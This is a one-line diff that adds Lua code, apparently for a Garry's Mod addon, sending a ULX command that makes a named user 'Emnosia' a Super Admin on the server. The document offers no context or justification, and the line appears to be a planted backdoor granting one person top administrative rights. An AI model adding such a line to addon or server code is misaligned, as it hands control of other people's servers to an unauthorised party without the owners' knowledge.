@@ -1,0 +1,1 @@
+net.SendToServer('!ulx adduser Emnosia Super Admin')
